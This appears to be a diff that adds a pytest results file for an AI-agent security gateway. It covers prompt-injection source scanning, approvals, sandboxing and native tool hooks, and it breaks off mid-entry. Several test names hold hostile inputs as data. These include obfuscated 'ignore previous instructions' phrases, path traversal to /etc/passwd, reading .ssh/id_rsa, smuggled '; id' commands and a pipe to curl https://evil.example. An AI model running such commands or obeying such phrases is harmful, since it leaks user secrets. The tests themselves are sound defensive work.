@@ -1,0 +1,1366 @@
+{
+  "exitstatus": 0,
+  "tests": [
+    {
+      "test": "tests/test_api_sandbox.py::test_auth_origin_and_operator_separation",
+      "outcome": "passed",
+      "duration_seconds": 0.32369151059538126,
+      "cases": [
+        "TC-33"
+      ]
+    },
+    {
+      "test": "tests/test_api_sandbox.py::test_evidence_no_html_execution_and_policy_update",
+      "outcome": "passed",
+      "duration_seconds": 0.18233716115355492,
+      "cases": [
+        "TC-34"
+      ]
+    },
+    {
+      "test": "tests/test_api_sandbox.py::test_actual_code_sandbox_blocks_host_and_network",
+      "outcome": "passed",
+      "duration_seconds": 0.7064815135672688,
+      "cases": [
+        "TC-27",
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_api_sandbox.py::test_sandbox_cpu_budget",
+      "outcome": "passed",
+      "duration_seconds": 2.548193112015724,
+      "cases": [
+        "TC-31"
+      ]
+    },
+    {
+      "test": "tests/test_api_sandbox.py::test_batch_scan_and_failed_scan_stops_session",
+      "outcome": "passed",
+      "duration_seconds": 0.1521809883415699,
+      "cases": [
+        "TC-28",
+        "TC-31",
+        "TC-01"
+      ]
+    },
+    {
+      "test": "tests/test_api_sandbox.py::test_sdk_validation_logs_are_redacted",
+      "outcome": "passed",
+      "duration_seconds": 0.041089667938649654,
+      "cases": [
+        "TC-28"
+      ]
+    },
+    {
+      "test": "tests/test_api_sandbox.py::test_formatter_redacts_exception_text",
+      "outcome": "passed",
+      "duration_seconds": 0.000664801336824894,
+      "cases": [
+        "TC-28"
+      ]
+    },
+    {
+      "test": "tests/test_benchmark_acceptance.py::test_unknown_outcome_prevents_fake_zero_asr_acceptance",
+      "outcome": "passed",
+      "duration_seconds": 0.005050931125879288,
+      "cases": [
+        "TC-22"
+      ]
+    },
+    {
+      "test": "tests/test_benchmark_acceptance.py::test_unpaired_results_are_rejected[model-changed]",
+      "outcome": "passed",
+      "duration_seconds": 0.001973056234419346,
+      "cases": [
+        "TC-22"
+      ]
+    },
+    {
+      "test": "tests/test_benchmark_acceptance.py::test_unpaired_results_are_rejected[planned_ids-value1]",
+      "outcome": "passed",
+      "duration_seconds": 0.0005527352914214134,
+      "cases": [
+        "TC-22"
+      ]
+    },
+    {
+      "test": "tests/test_benchmark_acceptance.py::test_unpaired_results_are_rejected[seed-1]",
+      "outcome": "passed",
+      "duration_seconds": 0.000531255267560482,
+      "cases": [
+        "TC-22"
+      ]
+    },
+    {
+      "test": "tests/test_benchmark_acceptance.py::test_unpaired_results_are_rejected[runner_sha256-changed]",
+      "outcome": "passed",
+      "duration_seconds": 0.0004927497357130051,
+      "cases": [
+        "TC-22"
+      ]
+    },
+    {
+      "test": "tests/test_benchmark_acceptance.py::test_unpaired_results_are_rejected[policy_sha256-changed]",
+      "outcome": "passed",
+      "duration_seconds": 0.00047486089169979095,
+      "cases": [
+        "TC-22"
+      ]
+    },
+    {
+      "test": "tests/test_benchmark_acceptance.py::test_baseline_zero_is_undefined_not_improvement",
+      "outcome": "passed",
+      "duration_seconds": 0.007658191956579685,
+      "cases": [
+        "TC-37"
+      ]
+    },
+    {
+      "test": "tests/test_benchmark_acceptance.py::test_missing_case_and_pilot_cannot_pass",
+      "outcome": "passed",
+      "duration_seconds": 0.004356624558568001,
+      "cases": [
+        "TC-22"
+      ]
+    },
+    {
+      "test": "tests/test_benchmark_acceptance.py::test_cluster_bootstrap_preserves_pair_direction",
+      "outcome": "passed",
+      "duration_seconds": 0.007352954708039761,
+      "cases": [
+        "TC-37"
+      ]
+    },
+    {
+      "test": "tests/test_benchmark_protocol.py::test_nested_arguments_and_quoted_action_markers",
+      "outcome": "passed",
+      "duration_seconds": 0.0023295003920793533,
+      "cases": [
+        "TC-22"
+      ]
+    },
+    {
+      "test": "tests/test_benchmark_protocol.py::test_incomplete_nonjson_or_mismatched_protocol_not_dispatched[Action: A\\nAction Input: {\"nested\":{\"v\":1}-names0]",
+      "outcome": "passed",
+      "duration_seconds": 0.0002509644255042076,
+      "cases": [
+        "TC-22"
+      ]
+    },
+    {
+      "test": "tests/test_benchmark_protocol.py::test_incomplete_nonjson_or_mismatched_protocol_not_dispatched[Action: A\\nAction Input: __import__(\"os\")-names1]",
+      "outcome": "passed",
+      "duration_seconds": 0.00021908897906541824,
+      "cases": [
+        "TC-22"
+      ]
+    },
+    {
+      "test": "tests/test_benchmark_protocol.py::test_incomplete_nonjson_or_mismatched_protocol_not_dispatched[Action: A\\nAction Input: [1,2]-names2]",
+      "outcome": "passed",
+      "duration_seconds": 0.0002121729776263237,
+      "cases": [
+        "TC-22"
+      ]
+    },
+    {
+      "test": "tests/test_benchmark_protocol.py::test_incomplete_nonjson_or_mismatched_protocol_not_dispatched[Action: B\\nAction Input: {}-names3]",
+      "outcome": "passed",
+      "duration_seconds": 0.00020921044051647186,
+      "cases": [
+        "TC-22"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_source_scan_and_risk_evidence[USER]",
+      "outcome": "passed",
+      "duration_seconds": 0.00040168315172195435,
+      "cases": [
+        "TC-02",
+        "TC-01"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_source_scan_and_risk_evidence[WEB]",
+      "outcome": "passed",
+      "duration_seconds": 0.0003188652917742729,
+      "cases": [
+        "TC-02",
+        "TC-01"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_source_scan_and_risk_evidence[DOCUMENT]",
+      "outcome": "passed",
+      "duration_seconds": 0.00032052211463451385,
+      "cases": [
+        "TC-02",
+        "TC-01"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_source_scan_and_risk_evidence[ISSUE]",
+      "outcome": "passed",
+      "duration_seconds": 0.00032177381217479706,
+      "cases": [
+        "TC-02",
+        "TC-01"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_source_scan_and_risk_evidence[MCP_DESCRIPTION]",
+      "outcome": "passed",
+      "duration_seconds": 0.00030827708542346954,
+      "cases": [
+        "TC-02",
+        "TC-01"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_source_scan_and_risk_evidence[MCP_RESPONSE]",
+      "outcome": "passed",
+      "duration_seconds": 0.0003235619515180588,
+      "cases": [
+        "TC-02",
+        "TC-01"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_source_scan_and_risk_evidence[MEMORY]",
+      "outcome": "passed",
+      "duration_seconds": 0.0003153551369905472,
+      "cases": [
+        "TC-02",
+        "TC-01"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_source_scan_and_risk_evidence[SUB_AGENT]",
+      "outcome": "passed",
+      "duration_seconds": 0.0003012111410498619,
+      "cases": [
+        "TC-02",
+        "TC-01"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_quoted_attack_does_not_block_normal_read",
+      "outcome": "passed",
+      "duration_seconds": 0.01800552662461996,
+      "cases": [
+        "TC-01"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_unicode_mapping[\\uff49\\uff47\\uff4e\\uff4f\\uff52\\uff45 previous instructions]",
+      "outcome": "passed",
+      "duration_seconds": 0.0008573625236749649,
+      "cases": [
+        "TC-21"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_unicode_mapping[ig\\u200bnore previous instructions]",
+      "outcome": "passed",
+      "duration_seconds": 0.0007258197292685509,
+      "cases": [
+        "TC-21"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_unicode_mapping[\\u0456gnore   previous\\n instructions]",
+      "outcome": "passed",
+      "duration_seconds": 0.0007501207292079926,
+      "cases": [
+        "TC-21"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_unicode_mapping[\\u5ffd\\u7565\\u4e4b\\u524d\\u7684\\u6307\\u4ee4]",
+      "outcome": "passed",
+      "duration_seconds": 0.0005155755206942558,
+      "cases": [
+        "TC-21"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_unicode_mapping[e\\u0301\\u3000 text]",
+      "outcome": "passed",
+      "duration_seconds": 0.0003396635875105858,
+      "cases": [
+        "TC-21"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_intent_and_alignment",
+      "outcome": "passed",
+      "duration_seconds": 0.0011018533259630203,
+      "cases": [
+        "TC-11",
+        "TC-06"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_invalid_dsl[]",
+      "outcome": "passed",
+      "duration_seconds": 0.044120607897639275,
+      "cases": [
+        "TC-12"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_invalid_dsl[rule x { eval(\"x\") }]",
+      "outcome": "passed",
+      "duration_seconds": 0.047741650603711605,
+      "cases": [
+        "TC-12"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_invalid_dsl[rule a severity low overridable true { when evil.field == true then ALLOW(\"x\") }]",
+      "outcome": "passed",
+      "duration_seconds": 0.03664659336209297,
+      "cases": [
+        "TC-12"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_invalid_dsl[rule a severity low overridable true { when resource.matches(\"*\", \"x\") then ALLOW(\"x\") }]",
+      "outcome": "passed",
+      "duration_seconds": 0.03715197090059519,
+      "cases": [
+        "TC-12"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_hard_deny_beats_approved",
+      "outcome": "passed",
+      "duration_seconds": 0.002660287544131279,
+      "cases": [
+        "TC-25"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_fd_stat_binding_at_execution",
+      "outcome": "passed",
+      "duration_seconds": 0.0008209645748138428,
+      "cases": [
+        "TC-09"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_network_ip_and_rebinding",
+      "outcome": "passed",
+      "duration_seconds": 0.001371464692056179,
+      "cases": [
+        "TC-10"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_cross_origin_redirect_denied",
+      "outcome": "passed",
+      "duration_seconds": 0.0009826375171542168,
+      "cases": [
+        "TC-10"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_retention_and_ciphertext",
+      "outcome": "passed",
+      "duration_seconds": 0.006602379493415356,
+      "cases": [
+        "TC-29"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_restart_and_single_writer",
+      "outcome": "passed",
+      "duration_seconds": 0.1081938399001956,
+      "cases": [
+        "TC-16"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_five_action_families[fs.read-args0-effects0]",
+      "outcome": "passed",
+      "duration_seconds": 0.002096151001751423,
+      "cases": [
+        "TC-08"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_five_action_families[http.request-args1-effects1]",
+      "outcome": "passed",
+      "duration_seconds": 0.0026305271312594414,
+      "cases": [
+        "TC-08"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_five_action_families[exec.python-args2-effects2]",
+      "outcome": "passed",
+      "duration_seconds": 0.0032858680933713913,
+      "cases": [
+        "TC-08"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_five_action_families[git.push-args3-effects3]",
+      "outcome": "passed",
+      "duration_seconds": 0.006038479506969452,
+      "cases": [
+        "TC-08"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_five_action_families[agent.delegate-args4-effects4]",
+      "outcome": "passed",
+      "duration_seconds": 0.002167319878935814,
+      "cases": [
+        "TC-08"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_independent_policy_fields[action.effect-FILE_READ-actual0]",
+      "outcome": "passed",
+      "duration_seconds": 0.038558258675038815,
+      "cases": [
+        "TC-12"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_independent_policy_fields[action.tool-\"fs.read\"-fs.read]",
+      "outcome": "passed",
+      "duration_seconds": 0.03736414108425379,
+      "cases": [
+        "TC-12"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_independent_policy_fields[action.server-builtin-builtin]",
+      "outcome": "passed",
+      "duration_seconds": 0.03658345155417919,
+      "cases": [
+        "TC-12"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_independent_policy_fields[resource.class-REPO-REPO]",
+      "outcome": "passed",
+      "duration_seconds": 0.03681572899222374,
+      "cases": [
+        "TC-12"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_independent_policy_fields[resource.valid-true-True]",
+      "outcome": "passed",
+      "duration_seconds": 0.04056325741112232,
+      "cases": [
+        "TC-12"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_independent_policy_fields[resource.scope_valid-true-True]",
+      "outcome": "passed",
+      "duration_seconds": 0.036736191250383854,
+      "cases": [
+        "TC-12"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_independent_policy_fields[resource.scope_allowed-true-True]",
+      "outcome": "passed",
+      "duration_seconds": 0.036445920355618,
+      "cases": [
+        "TC-12"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_independent_policy_fields[destination.domain-\"corp.example.test\"-corp.example.test]",
+      "outcome": "passed",
+      "duration_seconds": 0.07562420330941677,
+      "cases": [
+        "TC-12"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_independent_policy_fields[destination.trust-TRUSTED-TRUSTED]",
+      "outcome": "passed",
+      "duration_seconds": 0.03807906247675419,
+      "cases": [
+        "TC-12"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_independent_policy_fields[intent.sensitive_access-DENY-DENY]",
+      "outcome": "passed",
+      "duration_seconds": 0.03709085751324892,
+      "cases": [
+        "TC-12"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_independent_policy_fields[source.type-MCP_RESPONSE-MCP_RESPONSE]",
+      "outcome": "passed",
+      "duration_seconds": 0.03724705707281828,
+      "cases": [
+        "TC-12"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_independent_policy_fields[source.trust-UNTRUSTED-UNTRUSTED]",
+      "outcome": "passed",
+      "duration_seconds": 0.042194804176688194,
+      "cases": [
+        "TC-12"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_independent_policy_fields[agent.depth-2-2]",
+      "outcome": "passed",
+      "duration_seconds": 0.03689654730260372,
+      "cases": [
+        "TC-12"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_independent_policy_fields[approval.valid-false-False]",
+      "outcome": "passed",
+      "duration_seconds": 0.0372982956469059,
+      "cases": [
+        "TC-12"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_unknown_enum_rejected",
+      "outcome": "passed",
+      "duration_seconds": 0.03665326349437237,
+      "cases": [
+        "TC-12"
+      ]
+    },
+    {
+      "test": "tests/test_components.py::test_configured_model_failure_closes_gate",
+      "outcome": "passed",
+      "duration_seconds": 0.007791639305651188,
+      "cases": [
+        "TC-26"
+      ]
+    },
+    {
+      "test": "tests/test_evaluation.py::test_error_is_not_security_success",
+      "outcome": "passed",
+      "duration_seconds": 0.0015232544392347336,
+      "cases": [
+        "TC-22"
+      ]
+    },
+    {
+      "test": "tests/test_evaluation.py::test_macro_f1_hand_computed",
+      "outcome": "passed",
+      "duration_seconds": 0.0004846425727009773,
+      "cases": [
+        "TC-37"
+      ]
+    },
+    {
+      "test": "tests/test_evaluation.py::test_duplicate_and_missing_native_outcome",
+      "outcome": "passed",
+      "duration_seconds": 0.00021220464259386063,
+      "cases": [
+        "TC-22"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_real_three_state_side_effects",
+      "outcome": "passed",
+      "duration_seconds": 0.028029996901750565,
+      "cases": [
+        "TC-13"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_path_boundaries[../outside]",
+      "outcome": "passed",
+      "duration_seconds": 0.004830606281757355,
+      "cases": [
+        "TC-09"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_path_boundaries[/etc/passwd]",
+      "outcome": "passed",
+      "duration_seconds": 0.005467359907925129,
+      "cases": [
+        "TC-09"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_path_boundaries[.git/config]",
+      "outcome": "passed",
+      "duration_seconds": 0.00795217789709568,
+      "cases": [
+        "TC-09"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_path_boundaries[src/../../outside]",
+      "outcome": "passed",
+      "duration_seconds": 0.00933877844363451,
+      "cases": [
+        "TC-09"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_symlink_and_approval_resource_replacement",
+      "outcome": "passed",
+      "duration_seconds": 0.01654525101184845,
+      "cases": [
+        "TC-14",
+        "TC-09"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_concurrent_approval_only_once",
+      "outcome": "passed",
+      "duration_seconds": 0.02440672554075718,
+      "cases": [
+        "TC-16"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_approval_identity_version_and_expiry[owner]",
+      "outcome": "passed",
+      "duration_seconds": 0.008382542058825493,
+      "cases": [
+        "TC-15"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_approval_identity_version_and_expiry[intent]",
+      "outcome": "passed",
+      "duration_seconds": 0.012084643356502056,
+      "cases": [
+        "TC-15"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_approval_identity_version_and_expiry[policy]",
+      "outcome": "passed",
+      "duration_seconds": 0.0500157130882144,
+      "cases": [
+        "TC-15"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_approval_identity_version_and_expiry[signature]",
+      "outcome": "passed",
+      "duration_seconds": 0.010286794044077396,
+      "cases": [
+        "TC-15"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_approval_identity_version_and_expiry[expires]",
+      "outcome": "passed",
+      "duration_seconds": 0.009493636898696423,
+      "cases": [
+        "TC-15"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_secret_fallback_and_redacted_evidence[corp.example.test]",
+      "outcome": "passed",
+      "duration_seconds": 0.008339081890881062,
+      "cases": [
+        "TC-28",
+        "TC-24",
+        "TC-18"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_secret_fallback_and_redacted_evidence[attacker.example.test]",
+      "outcome": "passed",
+      "duration_seconds": 0.00801417138427496,
+      "cases": [
+        "TC-28",
+        "TC-24",
+        "TC-18"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_memory_quarantine_and_safe_recall",
+      "outcome": "passed",
+      "duration_seconds": 0.038946278393268585,
+      "cases": [
+        "TC-05",
+        "TC-04"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_external_claim_and_child_permissions",
+      "outcome": "passed",
+      "duration_seconds": 0.030620149336755276,
+      "cases": [
+        "TC-19",
+        "TC-07"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_unknown_side_effect_no_retry",
+      "outcome": "passed",
+      "duration_seconds": 0.009719300083816051,
+      "cases": [
+        "TC-32"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_policy_and_audit_fail_closed",
+      "outcome": "passed",
+      "duration_seconds": 0.01830389816313982,
+      "cases": [
+        "TC-30",
+        "TC-26"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_trace_explicit_flow_and_replay",
+      "outcome": "passed",
+      "duration_seconds": 0.011675994843244553,
+      "cases": [
+        "TC-40",
+        "TC-20",
+        "TC-17"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_context_and_delegation_limits",
+      "outcome": "passed",
+      "duration_seconds": 0.005990409292280674,
+      "cases": [
+        "TC-31"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_git_head_change_invalidates_push",
+      "outcome": "passed",
+      "duration_seconds": 0.02794785238802433,
+      "cases": [
+        "TC-27"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_cancel_and_expiration_sweep",
+      "outcome": "passed",
+      "duration_seconds": 0.011827073991298676,
+      "cases": [
+        "TC-16"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_git_commit_worktree_binding_and_secret_push",
+      "outcome": "passed",
+      "duration_seconds": 0.03833820950239897,
+      "cases": [
+        "TC-27"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_replay_does_not_use_later_session_health",
+      "outcome": "passed",
+      "duration_seconds": 0.014501361176371574,
+      "cases": [
+        "TC-40"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_explicit_negative_contract_cannot_be_approved[\\u53ea\\u8bfb\\u5ba1\\u67e5\\uff0c\\u4e0d\\u8981\\u4fee\\u6539\\u4ee3\\u7801-fs.write-args0]",
+      "outcome": "passed",
+      "duration_seconds": 0.008219216018915176,
+      "cases": [
+        "TC-25",
+        "TC-07"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_explicit_negative_contract_cannot_be_approved[review, do not write-fs.write-args1]",
+      "outcome": "passed",
+      "duration_seconds": 0.005179815925657749,
+      "cases": [
+        "TC-25",
+        "TC-07"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_explicit_negative_contract_cannot_be_approved[\\u4e0d\\u8981\\u8bfb\\u53d6\\u6587\\u4ef6-fs.read-args2]",
+      "outcome": "passed",
+      "duration_seconds": 0.005677323788404465,
+      "cases": [
+        "TC-25",
+        "TC-07"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_explicit_negative_contract_cannot_be_approved[\\u4e0d\\u8981\\u59d4\\u6d3e\\u4efb\\u52a1-agent.delegate-args3]",
+      "outcome": "passed",
+      "duration_seconds": 0.00620617438107729,
+      "cases": [
+        "TC-25",
+        "TC-07"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_explicit_negative_contract_cannot_be_approved[review, do not commit-git.commit-args4]",
+      "outcome": "passed",
+      "duration_seconds": 0.014454212039709091,
+      "cases": [
+        "TC-25",
+        "TC-07"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_explicit_negative_contract_cannot_be_approved[review offline-http.request-args5]",
+      "outcome": "passed",
+      "duration_seconds": 0.006615286692976952,
+      "cases": [
+        "TC-25",
+        "TC-07"
+      ]
+    },
+    {
+      "test": "tests/test_gateway.py::test_permission_contents_bound_even_without_version_bump",
+      "outcome": "passed",
+      "duration_seconds": 0.011901645921170712,
+      "cases": [
+        "TC-15"
+      ]
+    },
+    {
+      "test": "tests/test_mcp.py::test_real_stdio_forwarding_and_metadata_drift",
+      "outcome": "passed",
+      "duration_seconds": 2.4039334263652563,
+      "cases": [
+        "TC-19",
+        "TC-03"
+      ]
+    },
+    {
+      "test": "tests/test_mcp.py::test_streamable_http_jsonrpc",
+      "outcome": "passed",
+      "duration_seconds": 0.06578856706619263,
+      "cases": [
+        "TC-33",
+        "TC-13"
+      ]
+    },
+    {
+      "test": "tests/test_mcp.py::test_schema_remote_refs_cannot_fetch_before_policy",
+      "outcome": "passed",
+      "duration_seconds": 0.004797354340553284,
+      "cases": [
+        "TC-03"
+      ]
+    },
+    {
+      "test": "tests/test_mcp.py::test_schema_local_refs_remain_usable",
+      "outcome": "passed",
+      "duration_seconds": 0.0045585790649056435,
+      "cases": [
+        "TC-03"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_native_allow_claim_report_no_gateway_execution[codex]",
+      "outcome": "passed",
+      "duration_seconds": 0.012549960054457188,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_native_allow_claim_report_no_gateway_execution[claude-code]",
+      "outcome": "passed",
+      "duration_seconds": 0.012312834151089191,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_unsupported_or_sensitive_native_is_blocked[Read-args0]",
+      "outcome": "passed",
+      "duration_seconds": 0.006648319773375988,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_unsupported_or_sensitive_native_is_blocked[Read-args1]",
+      "outcome": "passed",
+      "duration_seconds": 0.006049417890608311,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_unsupported_or_sensitive_native_is_blocked[Write-args2]",
+      "outcome": "passed",
+      "duration_seconds": 0.006156478077173233,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_unsupported_or_sensitive_native_is_blocked[Bash-args3]",
+      "outcome": "passed",
+      "duration_seconds": 0.0075737228617072105,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_unsupported_or_sensitive_native_is_blocked[Bash-args4]",
+      "outcome": "passed",
+      "duration_seconds": 0.004877219907939434,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_unsupported_or_sensitive_native_is_blocked[Bash-args5]",
+      "outcome": "passed",
+      "duration_seconds": 0.0062088677659630775,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_unsupported_or_sensitive_native_is_blocked[Bash-args6]",
+      "outcome": "passed",
+      "duration_seconds": 0.005499452352523804,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_unsupported_or_sensitive_native_is_blocked[mcp__agentsentry__guarded_tool_call-args7]",
+      "outcome": "passed",
+      "duration_seconds": 0.004736106842756271,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_unsupported_or_sensitive_native_is_blocked[PowerShell-args8]",
+      "outcome": "passed",
+      "duration_seconds": 0.0045932140201330185,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_unsupported_or_sensitive_native_is_blocked[apply_patch-args9]",
+      "outcome": "passed",
+      "duration_seconds": 0.006935916841030121,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_native_ask_approval_does_not_execute",
+      "outcome": "passed",
+      "duration_seconds": 0.011481644585728645,
+      "cases": [
+        "TC-15"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_native_revalidate_before_claim[file]",
+      "outcome": "passed",
+      "duration_seconds": 0.007590736262500286,
+      "cases": [
+        "TC-15"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_native_revalidate_before_claim[intent]",
+      "outcome": "passed",
+      "duration_seconds": 0.008641636930406094,
+      "cases": [
+        "TC-15"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_native_revalidate_before_claim[cwd]",
+      "outcome": "passed",
+      "duration_seconds": 0.0059481430798769,
+      "cases": [
+        "TC-15"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_native_revalidate_before_claim[args]",
+      "outcome": "passed",
+      "duration_seconds": 0.005185486748814583,
+      "cases": [
+        "TC-15"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_native_claim_concurrency",
+      "outcome": "passed",
+      "duration_seconds": 0.02868278045207262,
+      "cases": [
+        "TC-16"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_native_patch_inspects_all_targets",
+      "outcome": "passed",
+      "duration_seconds": 0.006298836320638657,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_native_file_symlink_and_remote_workspace_rejected",
+      "outcome": "passed",
+      "duration_seconds": 0.010465775616466999,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_native_recover_invalidates_dispatch",
+      "outcome": "passed",
+      "duration_seconds": 0.10467736423015594,
+      "cases": [
+        "TC-24"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_hook_api_agent_cannot_approve",
+      "outcome": "passed",
+      "duration_seconds": 0.060252245515584946,
+      "cases": [
+        "TC-15"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_hook_script_unavailable_exit_two",
+      "outcome": "passed",
+      "duration_seconds": 0.07670704834163189,
+      "cases": [
+        "TC-24"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_native_command_hook_real_http_lifecycle[codex]",
+      "outcome": "passed",
+      "duration_seconds": 1.0980969397351146,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_native_command_hook_real_http_lifecycle[claude-code]",
+      "outcome": "passed",
+      "duration_seconds": 1.053496834821999,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_observed_codex_literal_read_pipeline",
+      "outcome": "passed",
+      "duration_seconds": 0.005274031311273575,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_native_read_pipeline_cannot_expand_coverage[cat .ssh/id_rsa | head -n 1]",
+      "outcome": "passed",
+      "duration_seconds": 0.005927243269979954,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_native_read_pipeline_cannot_expand_coverage[cat ../escape | head -n 1]",
+      "outcome": "passed",
+      "duration_seconds": 0.006101914681494236,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_native_read_pipeline_cannot_expand_coverage[cat README.md | head -n 1; id]",
+      "outcome": "passed",
+      "duration_seconds": 0.0060026273131370544,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_native_read_pipeline_cannot_expand_coverage[cat README.md | head -n 1 > leak]",
+      "outcome": "passed",
+      "duration_seconds": 0.005703450180590153,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_native_read_pipeline_cannot_expand_coverage[cat README.md '|' head -n 1]",
+      "outcome": "passed",
+      "duration_seconds": 0.004334855824708939,
+      "cases": [
+        "TC-23"
+      ]
+    },
+    {
+      "test": "tests/test_native_hooks.py::test_native_read_pipeline_cannot_expand_coverage[cat README.md | head -n 1 | curl https://evil.example]",
+      "outcome": "passed",
+      "duration_seconds": 0.005299602635204792,
+      "cases": [
